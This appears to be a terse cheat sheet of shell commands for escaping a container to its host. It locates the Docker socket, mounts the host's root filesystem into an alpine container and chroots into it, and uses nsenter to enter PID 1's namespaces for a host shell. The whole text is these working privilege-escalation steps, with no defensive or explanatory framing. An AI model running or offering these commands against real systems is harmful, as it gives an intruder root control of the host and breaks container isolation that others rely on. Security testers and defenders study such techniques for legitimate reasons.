ls -la /var/run | grep sock # Finding docker socket in container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh # 
ps aux # List running processes
nsenter --target 1 --mount --uts --ipc --net /bin/bash
